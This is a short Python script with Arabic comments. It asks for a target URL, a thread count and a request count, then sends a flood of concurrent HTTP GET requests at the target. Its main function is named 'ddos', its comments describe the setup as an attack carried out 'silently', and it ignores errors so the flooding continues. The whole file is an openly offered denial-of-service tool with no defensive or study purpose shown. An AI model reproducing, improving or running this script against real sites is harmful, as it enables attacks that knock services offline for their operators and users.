import requests
import threading
from queue import Queue

# قائمة المهام (URLs)
urls = Queue()

def ddos():
    """
    تنفيذ الطلبات على الهدف بصمت تام.
    """
    while not urls.empty():
        url = urls.get()
        try:
            requests.get(url, timeout=5)  # إرسال الطلب
        except requests.exceptions.RequestException:
            pass  # تجاهل الأخطاء لضمان الاستمرارية
        urls.task_done()

def main():
    """
    الإعداد الرئيسي للهجوم.
    """
    target = input("Enter the target URL: ").strip()
    thread_count = int(input("Enter the number of threads: "))
    request_count = int(input("Enter the total number of requests: "))

    if thread_count <= 0 or request_count <= 0:
        return  # إنهاء البرنامج إذا كانت القيم غير صحيحة

    # إضافة الهدف إلى قائمة الطلبات
    for _ in range(request_count):
        urls.put(target)

    threads = []

    # إنشاء وتشغيل الخيوط
    for _ in range(thread_count):
        thread = threading.Thread(target=ddos)
        threads.append(thread)
        thread.start()

    # انتظار انتهاء جميع الخيوط
    for thread in threads:
        thread.join()

if __name__ == "__main__":
    main()
